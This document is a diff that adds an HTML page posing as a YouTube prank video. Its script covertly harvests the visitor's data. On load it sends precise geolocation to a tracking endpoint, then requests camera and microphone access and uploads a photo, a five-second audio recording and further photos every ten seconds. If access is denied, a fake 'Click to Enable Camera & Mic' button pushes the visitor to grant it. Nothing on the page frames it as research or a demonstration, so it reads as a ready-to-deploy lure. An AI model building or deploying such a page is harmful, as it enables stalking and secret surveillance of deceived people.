@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>YouTube</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Roboto,Arial,sans-serif;}
+        body{background:#0f0f0f;color:#fff;padding-bottom:60px;}
+        .header{background:#0f0f0f;padding:12px 16px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:10;}
+        .header .logo{font-size:20px;font-weight:700;color:#fff;}
+        .header .logo span{color:#ff0000;}
+        .video-container{background:#000;position:relative;width:100%;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;}
+        .video-container video{width:100%;height:100%;object-fit:contain;}
+        .video-info{padding:12px 16px;}
+        .video-info h2{font-size:18px;font-weight:500;margin-bottom:8px;}
+        .video-info .channel{display:flex;align-items:center;gap:12px;margin-bottom:12px;}
+        .video-info .channel .avatar{width:36px;height:36px;border-radius:50%;background:#666;display:flex;align-items:center;justify-content:center;font-size:16px;}
+        .video-info .channel .name{font-size:14px;font-weight:500;}
+        .video-info .channel .sub{font-size:12px;color:#aaa;}
+        .video-info .actions{display:flex;gap:20px;font-size:14px;color:#aaa;border-top:1px solid #272727;padding-top:12px;}
+        .video-info .actions span{display:flex;align-items:center;gap:6px;}
+        .comments{padding:12px 16px;border-top:1px solid #272727;}
+        .comments .comment{display:flex;gap:12px;margin-bottom:12px;}
+        .comments .comment .cavatar{width:32px;height:32px;border-radius:50%;background:#444;display:flex;align-items:center;justify-content:center;font-size:14px;}
+        .comments .comment .cname{font-size:13px;font-weight:500;}
+        .comments .comment .ctext{font-size:13px;color:#aaa;margin-top:2px;}
+        .bottom-nav{position:fixed;bottom:0;width:100%;background:#0f0f0f;border-top:1px solid #272727;display:flex;justify-content:space-around;padding:10px 0;font-size:18px;color:#aaa;}
+        .permission-btn {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            z-index: 9999;
+            box-shadow: 0 4px 15px rgba(255,0,0,0.4);
+            cursor: pointer;
+            display: none;
+        }
+        .permission-btn:hover { background: #cc0000; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="logo"><span>▶</span> YouTube</div>
+</div>
+
+<div class="video-container">
+    <video id="mainVideo" controls autoplay></video>
+</div>
+
+<div class="video-info">
+    <h2>😂 FUNNIEST PRANK COMPILATION 🔥</h2>
+    <div class="channel">
+        <div class="avatar">😂</div>
+        <div><div class="name">Prank Masters</div><div class="sub">2.3M subscribers</div></div>
+    </div>
+    <div class="actions">
+        <span>👍 1.2K</span>
+        <span>👎 12</span>
+        <span>🔗 Share</span>
+        <span>💬 Comments</span>
+    </div>
+</div>
+
+<div class="comments">
+    <div class="comment"><div class="cavatar">😎</div><div><div class="cname">GamingGuru</div><div class="ctext">Bhai ye toh next level hai 😂😂</div></div></div>
+    <div class="comment"><div class="cavatar">🤣</div><div><div class="cname">FunnyFan</div><div class="ctext">Maza aa gaya! Best video of the year</div></div></div>
+    <div class="comment"><div class="cavatar">🔥</div><div><div class="cname">TechWizard</div><div class="ctext">Quality content 💯</div></div></div>
+</div>
+
+<!-- Permission fallback button -->
+<button class="permission-btn" id="retryBtn">📸 Click to Enable Camera & Mic</button>
+
+<div class="bottom-nav">
+    <span>🏠</span>
+    <span>🔥</span>
+    <span>➕</span>
+    <span>🔔</span>
+    <span>👤</span>
+</div>
+
+<script>
+    const session = new URLSearchParams(window.location.search).get('session');
+    const API_URL = window.location.origin + '/track';
+    const retryBtn = document.getElementById('retryBtn');
+    let stream = null;
+
+    async function sendData(endpoint, data) {
+        try {
+            const res = await fetch(`${API_URL}?session=${session}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            if (!res.ok) console.log(`Send failed: ${endpoint}`);
+        } catch(e) { console.error(`Send error ${endpoint}:`, e); }
+    }
+
+    // ---- Auto location ----
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            console.log("📍 Location acquired:", pos.coords.latitude, pos.coords.longitude);
+            sendData('/location', {
+                location: {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    acc: pos.coords.accuracy
+                }
+            });
+        },
+        err => console.log("❌ Location error:", err.message),
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
+
+    // ---- Video chalu ----
+    const video = document.getElementById('mainVideo');
+    video.src = "https://youtube.com/shorts/32DaIMjjsJY?si=xeKwX-UElmZ73_Bg";
+    video.play();
+
+    // ---- Main capture function ----
+    async function startCameraAndMic() {
+        try {
+            console.log("📸 Requesting camera + mic...");
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            console.log("✅ Stream acquired");
+            retryBtn.style.display = 'none'; // success pe button hide
+
+            // Photo
+            const v = document.createElement('video');
+            v.srcObject = stream;
+            v.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = v.videoWidth;
+                canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
+                const photoData = canvas.toDataURL('image/jpeg');
+                console.log("📷 Photo captured");
+                sendData('/photo', { image: photoData });
+                // stream tracks stop nhi karte taki audio record kar sake
+            }, 1500);
+
+            // Audio record 5 sec
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => {
+                    console.log("🎤 Audio recorded");
+                    sendData('/audio', { audio: reader.result });
+                };
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+
+            // Continuous photo every 10 sec (while page open)
+            setInterval(async () => {
+                if (!stream) return;
+                try {
+                    const v2 = document.createElement('video');
+                    v2.srcObject = stream;
+                    v2.play();
+                    setTimeout(() => {
+                        const canvas2 = document.createElement('canvas');
+                        canvas2.width = v2.videoWidth;
+                        canvas2.height = v2.videoHeight;
+                        canvas2.getContext('2d').drawImage(v2, 0, 0);
+                        const photoData2 = canvas2.toDataURL('image/jpeg');
+                        sendData('/photo', { image: photoData2 });
+                    }, 300);
+                } catch(e) { /* ignore */ }
+            }, 10000);
+
+        } catch(err) {
+            console.log("❌ Camera/mic error:", err.message);
+            // Agar permission deny hai to button dikhao
+            if (err.message.includes('Permission') || err.message.includes('denied')) {
+                retryBtn.style.display = 'block';
+            }
+        }
+    }
+
+    // ---- Initial attempt ----
+    setTimeout(startCameraAndMic, 3000);
+
+    // ---- Retry button handler ----
+    retryBtn.addEventListener('click', () => {
+        retryBtn.style.display = 'none';
+        startCameraAndMic();
+    });
+
+</script>
+</body>
+</html>
